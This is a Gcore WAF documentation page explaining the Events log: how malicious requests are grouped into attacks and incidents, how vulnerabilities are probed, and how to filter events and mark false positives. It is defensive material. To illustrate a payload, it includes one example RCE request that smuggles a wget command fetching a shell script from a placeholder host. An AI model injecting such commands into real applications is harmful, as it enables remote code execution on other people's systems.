---
title: view-the-history-of-attacks-on-your-application
displayName: View events
published: true
order: 10
toc:
   --1--Events: "about-events"
   --2--How WAF combines requests: "how-waf-combines-requests-into-a-single-entity"
   --2--How WAF identifies vulnerabilities: "how-waf-identifies-vulnerabilities"
   --2--Purpose: "what-is-the-purpose-of-events"
   --1--Attacks: "attacks"
   --2--Attacks vs. incidents: "attacks-vs-incidents"
   --2--Check attacks: "check-attacks"
   --2--Active attacks: "active-attacks"
   --1--Incidents: "incidents"
   --2--About incidents: "about-incidents" 
   --2--Check incidents: "check-incidents"
   --1--False positive: "false-positive"
pageTitle: Explore WAF's Events | Gcore
pageDescription: Identify cyber attacks, find vulnerabilities, block IPs, and gather insightful analytics for superior application security with the WAF events log.
---
# View application attack history
   
## About Events

Events is a log store containing all malicious requests for your resources that have been repelled by <a href="https://gcore.com/web-security" target="_blank">Web Application Firewall (WAF)</a>. Entries in the log section are categorized into <a href="https://gcore.com/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application#attacks" target="_blank">Attacks</a> and <a href="https://gcore.com/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application#incidents" target="_blank">Incidents</a>. Attacks are all malicious requests, even if they do not pose a security threat. Unlike attacks, incidents are malicious requests that target a security weakness.

Here's how the log section looks:

<img src="https://assets.gcore.pro/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application/event-10.png" alt="Events log" width="80%">

### How WAF combines requests into a single entity

Every entry in the log is referred to as an event. An event can be a single malicious request or several related malicious requests.

For instance, if a hacker attempts to insert harmful code into an XML document's structure with one request, the log records this as an individual event. But if a hacker attempts to crack a password by making a thousand requests, the log clusters all these requests into one event, categorizing it as a “brute force” attack. You can access this event and examine the details of each of the thousand requests.

WAF groups several requests into a single event if they have these three elements in common:

- **Attack type**, which could be sqli, xss, rce, ptrav, crlf, nosqli, overlimit_res, xxe, ldapi, scanner, ssti, ssi, mail_injection, invalid_xml, data_bomb, dirbust, brute, vpatch, infoleak, or redir.
- **Payload**, which is a segment of a harmful request that includes directives for the targeted application and aids in identifying the attack type. For instance, if an attacker aims to insert harmful code into your application (RCE attack) and sends this request: ```curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh```, the harmful payload is ```wget+http://s```, which instructs the application to start downloading data. Some malicious requests, such as certain brute-force attacks, don't carry a payload.
- **The URL of a webpage or application file** to which the request is sent.

Even if the attacker's IP address and the timing of the requests is varied, attacks will nevertheless be consolidated into one event if they utilize the same attack type, payload, and target URL.

You can view all requests by clicking the + button of any provided event. 

<img src="https://assets.gcore.pro/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application/image_1863.png" alt="attack type" width="80%">

### How WAF identifies vulnerabilities

Here's how our WAF identifies vulnerabilities:

1. Periodically, WAF sends out non-harmful test requests to gauge the application's response. These requests aren't malicious but provide insight into how the application would respond during a real attack.
2. When an actual attack occurs, WAF stops it. Then, it duplicates the attack request, removes the malicious element and cookies, and sends several similar requests to the application under WAF's name. These requests won't cause damage, but they assist in understanding how the application would react to an attack if WAF didn't intervene.
3. It assesses the outcome of the checks from Steps 1 and 2. If the requests achieve their intended result, WAF deems that a vulnerability exists. If the application's response doesn't suggest it's susceptible to an attack, then there's no vulnerability.

Here's an example of the check: An attacker sends an “open redirect” (redir) type request. This type of attack alters links within your application so that when a user clicks on a link, they're directed to a fraudster’s page. WAF identifies the malicious request, removes the cookies and the malicious part, and then sends several similar but “neutralized” requests to the application. If the application fails to reject the requests, WAF considers this to be a vulnerability. If the application stops the requests, WAF determines there's no vulnerability.

### What is the purpose of Events?

Events provide detailed insights into malicious requests directed at your application. Here are three scenarios where this can be beneficial:

**Identify and resolve vulnerabilities**. By examining “incident”-type events, you can determine which parts of your application are susceptible and which types of attacks. This allows you to address these vulnerabilities.

**Prevent specific attacks**. The event log lets you see if your application is frequently targeted from a particular region or IP address. While these attacks are innocuous (since WAF blocks them,)  they still require processing by your server, thus reducing performance for end users. To conserve server resources, you can opt to block the offending IP addresses or regions in the “Access Settings” as per the <a href="https://gcore.com/docs/web-security/set-the-access-policy-for-a-protected-resource" target="_blank">Access Policy guide</a>.

**Gather analytical data to secure the private sections of your application**. By analyzing the logs of malicious requests, you can ascertain the most common attack techniques and the IP addresses frequently used. Using this information, you can better protect internal resources not covered by WAF (like an application administration panel or a private platform for employees) against common attacks. Additionally, you can block the IP addresses of frequent offenders.

## Attacks

### Attacks vs. incidents

Attacks refer to any malicious requests. However, not all attack-type events pose a threat. Some malicious requests cannot inflict damage as they target highly secure sections of an application. Even without WAF, your application can handle these requests and deny the attack. But other requests pose a genuine risk as they aim at weaknesses: If WAF hadn't intercepted them, they could have harmed the application. These high-risk requests are classified as incidents.

### Check attacks

Go to “Events” and click **Attacks**. To find the required data, set the search filters:

- **Date:** The date and time of the malicious request.
   - If several requests of the same type were detected at short intervals, the attack duration appears under the date. Duration is the time elapsed between a specific type's first and last request in the specified timeframe
   - If the attack is happening right now, this is indicated with the label ```attacks now```. 
- **Payloads**: Attack type and the number of unique malicious payloads.
- **Hits:** The attack's number of hits (requests) in the specified time frame.
- **Top IP/Source:** The IP address from which the malicious requests originated. When the malicious requests originate from several IP addresses, the interface shows the IP address responsible for the most requests. The following data is also displayed for the IP address:

   - Total number of IP addresses from which the requests in the same attack originated during the specified timeframe
   - Country/region in which the IP address is registered, if found in databases like IP2Location
   - Source type, like Public proxy, Web proxy, Tor, or the cloud platform the IP is registered in, etc, if found in databases like IP2Location
   - if the IP address is known for malicious activities based on public records and expert validations, the *Malicious IPs* label will appear

- **Domain/Path:** The domain, path, and the application ID that the request targeted.
- **Code:** Response code.
- **Parameter:** The malicious request’s parameters and tags of parsers applied to the request.

<img src="https://assets.gcore.pro/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application/waf-attacks.jpg" alt="How attacks are displayed in the WAF console">

### Active attacks

You can monitor active attacks in real time. You can find this information in the “Attacks” section: 

- The total count of events that have occurred in the last five minutes. This number can be found in the “Attacks” section.
- A special label will be visible in the attacks or incidents tab, positioned under the event date.

**Note**: For a more focused view, you can add a new keyword to the search field to display only those events happening at the moment: ```attacks now```.

## Incidents

### About incidents

Incidents refer to a malicious request that aims at an application's weak spot. When WAF encounters a harmful request, it blocks it and records an attack-type event. It then evaluates whether the request targets a weak or secure section of the application. If the target is a weak spot, WAF documents an incident. If the target is a secure, protected section, no action is taken.


### Check Incidents

WAF detects <a href="https://gcore.com/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application#how-waf-identifies-vulnerabilities" target="_blank">vulnerabilities</a> and creates security incidents.

You can check detected incidents in the **Incidents** section. To find the required data, use the search field described here or manually set the required filters.

- **Date:** The date and time of the malicious request.
   - If several requests of the same type were detected at short intervals, the attack duration appears under the date. Duration is the time elapsed between a specific type's first and last request in the specified timeframe
   - If the attack is happening right now, this is indicated with the label ```attacks now```.
- **Payloads**: Attack type and the number of unique malicious payloads.
- **Hits:** The attack's number of hits (requests) in the specified time frame.
- **Top IP/Source:** The IP address from which the malicious requests originated. When the malicious requests originate from several IP addresses, the interface shows the IP address responsible for the most requests. The following data is also displayed for the IP address:

   - Total number of IP addresses from which the requests in the same attack originated during the specified timeframe
   - Country/region in which the IP address is registered, if found in databases like IP2Location
   - Source type, like Public proxy, Web proxy, Tor, or the cloud platform the IP is registered in, etc, if found in databases like IP2Location
   - if the IP address is known for malicious activities based on public records and expert validations, the *Malicious IPs* label will appear

- **Domain/Path:** The domain, path, and the application ID that the request targeted.
- **Status:** The attack blocking status (linked to the traffic filtration mode):
   - *Blocked*: All attack requests were blocked by the filtering node
   - *Partially blocked*: Some attack requests were blocked, and others were only registered
   - *Monitoring*: All attack hits were registered but not blocked 

## False positive

False positive occurs when attack signs are detected in the legitimate request. Upon investigating the attack, you may determine that all or some requests are false positives. To avoid having the filtering node classify similar requests as attacks in subsequent traffic analyses, you can label a few requests or the entire attack or incident as a false positive.

To mark all hits in the attack as false positives:

1\. Go to the Attacks or Incidents section and select an attack with valid requests.

**Note**: To reduce the request analysis time, you can hide the malicious requests by using the tag ```!known```.

2\.  Click + in the event line and then **Mark as false positive**.

<img src="https://assets.gcore.pro/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application/13308797025553.png" alt="Mark requests as false positive" width="80%">

That’s it. WAF won't mark these false positives again.